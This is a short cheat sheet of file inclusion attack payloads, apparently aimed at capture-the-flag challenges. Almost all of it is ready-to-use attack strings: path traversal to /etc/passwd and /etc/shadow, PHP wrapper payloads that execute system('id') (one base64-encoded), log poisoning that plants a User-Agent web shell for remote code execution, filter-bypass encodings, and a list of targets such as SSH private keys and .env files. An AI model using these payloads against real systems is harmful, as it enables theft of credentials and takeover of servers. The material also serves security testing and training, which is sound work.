# Local/Remote File Inclusion (LFI/RFI)

## LFI Detection
```
?page=../../../etc/passwd
?file=....//....//....//etc/passwd
?include=php://filter/convert.base64-encode/resource=index.php
```

## PHP Wrappers
```
# Read source code (base64 encoded)
php://filter/convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=flag.php

# Execute code via input
php://input  (POST body: <?php system('id'); ?>)

# Data wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Expect wrapper (if enabled)
expect://id

# Zip wrapper
zip:///tmp/shell.zip#shell.php
```

## Log Poisoning (LFI to RCE)
1. Inject PHP code into access log via User-Agent:
   `User-Agent: <?php system($_GET['cmd']); ?>`
2. Include the log file:
   `?page=../../../var/log/apache2/access.log&cmd=id`

Common log paths:
- `/var/log/apache2/access.log`
- `/var/log/nginx/access.log`
- `/var/log/httpd/access_log`
- `/proc/self/environ`

## Interesting Files to Read
```
/etc/passwd
/etc/shadow (if readable)
/proc/self/cmdline
/proc/self/environ
/proc/self/fd/[0-9]*
/home/user/.ssh/id_rsa
/home/user/.bash_history
/var/www/html/config.php
/app/config.py
/app/.env
/flag
/flag.txt
/root/flag.txt
```

## Path Traversal Bypass
```
....//....//etc/passwd     (double dot bypass)
..%252f..%252f..%252fetc/passwd  (double URL encode)
..%c0%af..%c0%af..%c0%afetc/passwd  (Unicode bypass)
/var/www/html/../../../etc/passwd  (absolute path traversal)
```
